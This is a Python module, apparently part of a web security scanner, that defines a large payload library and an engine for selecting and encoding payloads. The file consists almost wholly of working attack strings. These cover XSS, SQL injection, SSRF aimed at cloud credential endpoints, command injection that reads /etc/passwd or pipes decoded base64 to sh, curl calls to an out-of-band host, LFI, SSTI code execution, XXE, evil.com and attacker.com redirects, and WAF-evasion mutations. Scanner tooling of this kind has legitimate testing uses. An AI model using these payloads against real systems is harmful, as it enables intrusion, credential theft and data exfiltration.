"""Universal payload mutation engine for all scanner modules."""
from __future__ import annotations
import base64
import random
import re
import string
import urllib.parse
from typing import Any

# ── XSS Payload Library ───────────────────────────────────────────────────────
XSS_PAYLOADS: dict[str, list[str]] = {
    "basic": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
    ],
    "attribute": [
        "\" onmouseover=\"alert(1)",
        "' onmouseover='alert(1)",
        "\" autofocus onfocus=\"alert(1)",
        "\" onclick=\"alert(1)",
        "`onmouseover=alert(1)`",
    ],
    "waf_bypass": [
        "<details/open/ontoggle=alert(1)>",
        "<svg><animatetransform onbegin=alert(1)>",
        "<img src onerror=alert(1)>",
        "<img\rsrc=x\ronerror=alert(1)>",
        "<img\tsrc=x\tonerror=alert(1)>",
        "<img\nsrc=x\nonerror=alert(1)>",
        "<<SCRIPT>alert(1)//<</SCRIPT>",
        "<svg><set attributename=onmouseover value=alert(1)>",
        "<script>onerror=alert;throw 1</script>",
        "<script>throw onerror=alert,1</script>",
        "<!--<img src=--><img src=x onerror=alert(1)//>",
        "<input autofocus onfocus=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<object data=javascript:alert(1)>",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    ],
    "dom": [
        "#<img src=x onerror=alert(1)>",
        "javascript:alert(document.domain)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    ],
    "csp_bypass": [
        "<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.8.0/angular.min.js></script><div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}",
        "<link rel=import href='//brutelogic.com.br/csp.html'>",
    ],
    "svg": [
        "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>",
        "<svg><use href='data:image/svg+xml,<svg id=\"x\" xmlns=\"http://www.w3.org/2000/svg\"><image href=\"x\" onerror=\"alert(1)\"/></svg>#x'>",
        "<svg><script>alert(1)</script></svg>",
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    ],
}

# ── SQLi Payload Library ──────────────────────────────────────────────────────
SQLI_PAYLOADS: dict[str, list[str]] = {
    "error_based": [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "1 AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1)--",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "' AND 1=1/0--",
        "' OR 1 GROUP BY CONCAT(version(),0x3a,FLOOR(RAND(0)*2)) HAVING MIN(0)--",
    ],
    "boolean_blind": [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "1 AND 1=1",
        "1 AND 1=2",
        "' AND SUBSTRING(version(),1,1)='5'--",
    ],
    "time_based": [
        "' AND SLEEP(5)--",
        "1 AND SLEEP(5)",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' OR SLEEP(5)--",
        "; SELECT pg_sleep(5)--",
        "1; SELECT pg_sleep(5)--",
        "' AND BENCHMARK(5000000,MD5(1))--",
        "'; EXEC xp_cmdshell('ping -c 5 127.0.0.1')--",
    ],
    "union": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT user(),2,3--",
        "' UNION SELECT version(),2,3--",
    ],
    "waf_bypass": [
        "1/*!50000UNION*//*!50000SELECT*/1,2,3--",
        "1 UnIoN SeLeCt 1,2,3--",
        "1%09UNION%09ALL%09SELECT%091,2,3--",
        "1%0bUNION%0bSELECT%0b1,2,3--",
        "1 UNION ALL SELECT NULL--",
        "1.0e1 OR 1=1",
        "1 OR 0x1=0x1",
        "1 OR 1 LIKE 1",
        "1 OR 1 BETWEEN 0 AND 2",
        "1'||'1'='1",
        "1 OR 1.0=1.0--",
        "1/**/UNION/**/SELECT/**/1,2,3",
    ],
}

# ── SSRF Payloads ─────────────────────────────────────────────────────────────
SSRF_PAYLOADS: dict[str, list[str]] = {
    "cloud_metadata": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
    ],
    "internal": [
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://2130706433/",
        "http://0x7f000001/",
        "http://0177.0.0.1/",
    ],
    "protocols": [
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///proc/self/environ",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_INFO",
        "ftp://127.0.0.1:21/",
        "ldap://127.0.0.1:389/",
    ],
    "bypass": [
        "http://127.1/",
        "http://localhost.example.com/",
        "http://spoofed.burpcollaborator.net@127.0.0.1/",
        "http://127.0.0.1#@evil.com/",
        "http://127.0.0.1%2523@evil.com/",
    ],
}

# ── Command Injection Payloads ────────────────────────────────────────────────
CMDI_PAYLOADS: dict[str, list[str]] = {
    "linux_basic": [
        "; id",
        "| id",
        "& id",
        "`id`",
        "$(id)",
        "; ls -la /",
        "| cat /etc/passwd",
        "&& cat /etc/passwd",
    ],
    "linux_time": [
        "; sleep 5",
        "| sleep 5",
        "& sleep 5",
        "$(sleep 5)",
        "`sleep 5`",
        "; ping -c 5 127.0.0.1",
    ],
    "windows_basic": [
        "& whoami",
        "| whoami",
        "&& whoami",
        "; whoami",
        "& dir C:\\",
        "| type C:\\Windows\\win.ini",
    ],
    "windows_time": [
        "& timeout 5",
        "| timeout 5",
        "& ping -n 5 127.0.0.1",
        "& powershell -c Start-Sleep 5",
    ],
    "waf_bypass": [
        "cat${IFS}/etc/passwd",
        "cat$IFS/etc/passwd",
        "{cat,/etc/passwd}",
        "c'a't /etc/passwd",
        'c"a"t /etc/passwd',
        "${IFS}cat${IFS}/etc/passwd",
        "$(echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|sh)",
        "%0aid",
        "\nid\n",
    ],
}

# ── LFI Payloads ──────────────────────────────────────────────────────────────
LFI_PAYLOADS: dict[str, list[str]] = {
    "unix": [
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/proc/self/environ",
        "/proc/version",
        "/proc/cmdline",
    ],
    "windows": [
        "..\\..\\windows\\win.ini",
        "..\\..\\..\\windows\\win.ini",
        "C:\\windows\\win.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\boot.ini",
    ],
    "bypass_encoding": [
        "..%2f..%2fetc%2fpasswd",
        "..%252f..%252fetc%252fpasswd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//etc/passwd",
        "..././..././etc/passwd",
        "..%c0%af..%c0%afetc%c0%afpasswd",
        "..%c1%9c..%c1%9cetc%c1%9cpasswd",
        "%2e%2e/%2e%2e/etc/passwd",
    ],
    "wrapper_php": [
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=/etc/passwd",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "expect://id",
        "zip://test.zip%23test.php",
    ],
}

# ── SSTI Payloads ─────────────────────────────────────────────────────────────
SSTI_PAYLOADS: dict[str, list[str]] = {
    "detection": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "{{7*'7'}}",
        "${{7*7}}",
        "[[7*7]]",
        "{{\"7\"*\"7\"}}",
    ],
    "jinja2": [
        "{{config}}",
        "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{''.__class__.__base__.__subclasses__()}}",
        "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
    ],
    "twig": [
        "{{7*7}}",
        "{{dump(app)}}",
        "{{app.request.server.all|join(',')}}",
        "{{_self.env.setCache('ftp://attacker.com:2121')}}{{_self.env.loadTemplate('shell')}}",
    ],
    "freemarker": [
        "${7*7}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    ],
    "velocity": [
        "#set($str=$class.inspect(\"java.lang.String\").type)#set($chr=$class.inspect(\"java.lang.Character\").type)#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
    ],
}

# ── XXE Payloads ──────────────────────────────────────────────────────────────
XXE_PAYLOADS: dict[str, list[str]] = {
    "classic": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
    ],
    "xinclude": [
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    ],
}

# ── Open Redirect Payloads ────────────────────────────────────────────────────
OPEN_REDIRECT_PAYLOADS: list[str] = [
    "https://evil.com",
    "//evil.com",
    "//evil.com/",
    "/\\evil.com",
    "//evil.com%2f%2e%2e",
    "https:evil.com",
    "http://0x45.0x4e.0x49.0x4c.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "%09//evil.com",
    "%0d%0aLocation: //evil.com",
    "/https://evil.com",
    "/%2F//evil.com",
]

# ── JWT Attack Payloads ───────────────────────────────────────────────────────
JWT_WEAK_SECRETS: list[str] = [
    "secret", "password", "123456", "admin", "key", "jwt", "token",
    "secret123", "password123", "qwerty", "abc123", "admin123",
    "supersecret", "mysecret", "letmein", "welcome", "monkey",
    "dragon", "master", "sunshine", "princess", "pass",
    "test", "testing", "dev", "development", "production",
]


class PayloadEngine:
    """Universal payload mutation and selection engine."""

    def __init__(self, oast_domain: str | None = None):
        self.oast_domain = oast_domain

    def get_xss(self, context: str = "html", waf_bypass: bool = False) -> list[str]:
        payloads = list(XSS_PAYLOADS["basic"])
        if context == "attribute":
            payloads.extend(XSS_PAYLOADS["attribute"])
        if context == "dom":
            payloads.extend(XSS_PAYLOADS["dom"])
        if waf_bypass:
            payloads.extend(XSS_PAYLOADS["waf_bypass"])
            payloads.extend(XSS_PAYLOADS["svg"])
        return payloads

    def get_sqli(self, technique: str = "all", waf_bypass: bool = False) -> list[str]:
        payloads: list[str] = []
        if technique in ("all", "error"):
            payloads.extend(SQLI_PAYLOADS["error_based"])
        if technique in ("all", "blind", "boolean"):
            payloads.extend(SQLI_PAYLOADS["boolean_blind"])
        if technique in ("all", "time"):
            payloads.extend(SQLI_PAYLOADS["time_based"])
        if technique in ("all", "union"):
            payloads.extend(SQLI_PAYLOADS["union"])
        if waf_bypass:
            payloads.extend(SQLI_PAYLOADS["waf_bypass"])
        return payloads

    def get_ssrf(self, include_oast: bool = True) -> list[str]:
        payloads = list(SSRF_PAYLOADS["cloud_metadata"] + SSRF_PAYLOADS["internal"]
                        + SSRF_PAYLOADS["bypass"])
        if include_oast and self.oast_domain:
            payloads.insert(0, f"http://{self.oast_domain}/")
            payloads.insert(1, f"https://{self.oast_domain}/")
        return payloads

    def get_cmdi(self, os_target: str = "linux", waf_bypass: bool = False) -> list[str]:
        payloads: list[str] = []
        if os_target in ("linux", "auto", "all"):
            payloads.extend(CMDI_PAYLOADS["linux_basic"])
            payloads.extend(CMDI_PAYLOADS["linux_time"])
        if os_target in ("windows", "auto", "all"):
            payloads.extend(CMDI_PAYLOADS["windows_basic"])
            payloads.extend(CMDI_PAYLOADS["windows_time"])
        if waf_bypass:
            payloads.extend(CMDI_PAYLOADS["waf_bypass"])
        if self.oast_domain:
            payloads.extend([
                f"; nslookup {self.oast_domain}",
                f"| curl http://{self.oast_domain}/",
                f"$(curl http://{self.oast_domain}/$(whoami))",
                f"& nslookup {self.oast_domain}",
                f"& powershell -c Invoke-WebRequest http://{self.oast_domain}/",
            ])
        return payloads

    def get_lfi(self, bypass: bool = False) -> list[str]:
        payloads = list(LFI_PAYLOADS["unix"] + LFI_PAYLOADS["windows"])
        if bypass:
            payloads.extend(LFI_PAYLOADS["bypass_encoding"])
            payloads.extend(LFI_PAYLOADS["wrapper_php"])
        return payloads

    def get_ssti(self, engines: list[str] | None = None) -> list[str]:
        payloads = list(SSTI_PAYLOADS["detection"])
        engine_map = {"jinja2": "jinja2", "twig": "twig",
                      "freemarker": "freemarker", "velocity": "velocity"}
        for engine in (engines or []):
            if engine.lower() in engine_map:
                payloads.extend(SSTI_PAYLOADS[engine_map[engine.lower()]])
        return payloads

    def get_xxe(self, oob: bool = False) -> list[str]:
        payloads = list(XXE_PAYLOADS["classic"] + XXE_PAYLOADS["xinclude"])
        if oob and self.oast_domain:
            payloads.append(
                f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{self.oast_domain}/xxe"> %xxe;]><root/>'
            )
        return payloads

    def mutate(self, payload: str, techniques: list[str]) -> list[str]:
        results = [payload]
        for technique in techniques:
            mutated: list[str] = []
            for p in results:
                mutated.append(p)
                if technique == "url_encode":
                    mutated.append(urllib.parse.quote(p))
                elif technique == "double_url_encode":
                    mutated.append(urllib.parse.quote(urllib.parse.quote(p)))
                elif technique == "html_entity":
                    mutated.append(p.replace("<", "&lt;").replace(">", "&gt;").replace("'", "&#x27;"))
                elif technique == "base64":
                    mutated.append(base64.b64encode(p.encode()).decode())
                elif technique == "hex_encode":
                    mutated.append("".join(f"%{c:02x}" for c in p.encode()))
                elif technique == "case_random":
                    mutated.append("".join(c.upper() if random.random() > 0.5 else c.lower() for c in p))
                elif technique == "null_byte":
                    mutated.append(p + "%00")
                elif technique == "comment_inject":
                    mutated.append(p.replace(" ", "/**/"))
            results = mutated
        return list(set(results))

    def generate_unique_marker(self) -> str:
        """Generate a unique string to detect reflection."""
        return "TALIS" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

    def get_header_injection_payloads(self) -> list[str]:
        return [
            "x-forwarded-for", "x-forwarded-host", "x-original-url",
            "x-rewrite-url", "x-real-ip", "x-client-ip", "x-originating-ip",
            "true-client-ip", "cf-connecting-ip", "x-custom-ip-authorization",
        ]
